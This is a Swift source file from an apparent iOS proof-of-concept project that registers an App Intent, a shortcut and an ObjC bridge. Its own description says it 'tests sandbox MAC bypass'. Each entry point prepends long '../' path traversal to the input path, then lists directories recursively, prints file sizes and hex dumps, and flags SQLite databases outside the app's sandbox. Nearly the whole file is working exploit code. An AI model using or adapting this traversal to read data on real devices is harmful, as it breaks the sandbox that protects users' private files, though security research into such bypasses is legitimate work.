import AppIntents
import Foundation

// MARK: - ObjC Bridge (callable from ViewController.m via UAFPoc-Swift.h)

@objc public class SwordAppIntentBridge: NSObject {

    /// Entry point for ObjC — tests directory enumeration via App Intents context
    @objc public func enumerateDirectory(_ dirPath: String) -> String {
        let fm = FileManager.default
        let base = "../../../../../../../../../../../../../"
        let fullPath = (base + dirPath as NSString).expandingTildeInPath

        var result = "[Swift AppIntents Bridge]\n"
        result += "target: \(fullPath)\n"

        var isDir: ObjCBool = false
        let exists = fm.fileExists(atPath: fullPath, isDirectory: &isDir)
        result += "exists: \(exists), isDir: \(isDir.boolValue)\n"

        if exists && isDir.boolValue {
            if let contents = try? fm.contentsOfDirectory(atPath: fullPath) {
                result += "Foundation contentsOfDir: \(contents.count) entries\n"
                for entry in contents.prefix(200) {
                    result += "  \(entry)\n"
                }
            } else {
                result += "Foundation contentsOfDir: FAILED\n"
            }

            if let enumerator = fm.enumerator(atPath: fullPath) {
                result += "\nRecursive enumerator (first 100):\n"
                var count = 0
                while let file = enumerator.nextObject() as? String, count < 100 {
                    result += "  \(file)\n"
                    count += 1
                }
                result += "  total: \(count) shown\n"
            } else {
                result += "Recursive enumerator: FAILED\n"
            }
        } else if exists {
            if let data = try? Data(contentsOf: URL(fileURLWithPath: fullPath)) {
                result += "file size: \(data.count) bytes\n"
                let hex = data.prefix(64).map { String(format: "%02x", $0) }.joined(separator: " ")
                result += "hex (first 64): \(hex)\n"
                if data.count >= 16 && data.prefix(16) == Data("SQLite format 3".utf8) {
                    result += "type: SQLite3\n"
                }
            }
        } else {
            result += "NOT FOUND\n"
        }

        return result
    }

    /// Quick probe — check if a single path exists
    @objc public func probePath(_ relPath: String) -> String {
        let base = "../../../../../../../../../../../../../"
        let fullPath = (base + relPath as NSString).expandingTildeInPath
        let fm = FileManager.default
        var isDir: ObjCBool = false
        let exists = fm.fileExists(atPath: fullPath, isDirectory: &isDir)
        if exists {
            let attrs = try? fm.attributesOfItem(atPath: fullPath)
            let sz = attrs?[.size] as? UInt64 ?? 0
            return "[+] \(relPath) (\(sz) bytes)\(isDir.boolValue ? " [DIR]" : "")"
        }
        return "[-] \(relPath)"
    }
}

// MARK: - App Intent (registered with system for XPC path resolution)

public struct SwordDirectoryIntent: AppIntent {
    public static var title: LocalizedStringResource = "Enumerate Directory"
    public static var description = IntentDescription(
        "Enumerates a directory path — tests sandbox MAC bypass",
        category: .information
    )

    @Parameter(
        title: "Directory Path",
        description: "Relative path to enumerate (with ../ traversal)",
        inputOptions: .init(keyboardType: .URL)
    )
    var targetPath: String

    public init() {
        self.targetPath = ""
    }

    public init(targetPath: String) {
        self.targetPath = targetPath
    }

    @MainActor
    public func perform() async throws -> some IntentResult & ReturnsValue<String> {
        let fm = FileManager.default
        let base = "../../../../../../../../../../../../../"
        let fullPath = (base + targetPath as NSString).expandingTildeInPath

        var output = "[SwordDirectoryIntent]\n"
        output += "path: \(fullPath)\n"

        var isDir: ObjCBool = false
        guard fm.fileExists(atPath: fullPath, isDirectory: &isDir) else {
            return .result(value: output + "NOT FOUND")
        }

        if isDir.boolValue {
            if let contents = try? fm.contentsOfDirectory(atPath: fullPath) {
                output += "entries: \(contents.count)\n"
                for entry in contents.prefix(500) {
                    output += "  \(entry)\n"
                }
            } else {
                output += "contentsOfDirectory: BLOCKED\n"
            }
        } else {
            if let data = try? Data(contentsOf: URL(fileURLWithPath: fullPath)) {
                output += "file size: \(data.count) bytes\n"
                let preview = data.prefix(200).map { String(format: "%02x", $0) }.joined(separator: " ")
                output += "hex: \(preview)\n"
            }
        }

        return .result(value: output)
    }
}

// MARK: - App Shortcut (makes intent available to system)

public struct SwordAppShortcuts: AppShortcutsProvider {
    public static var appShortcuts: [AppShortcut] {
        AppShortcut(
            intent: SwordDirectoryIntent(),
            phrases: [
                "Enumerate \(.applicationName) directory"
            ],
            shortTitle: "Enum Dir",
            systemImageName: "folder"
        )
    }
}
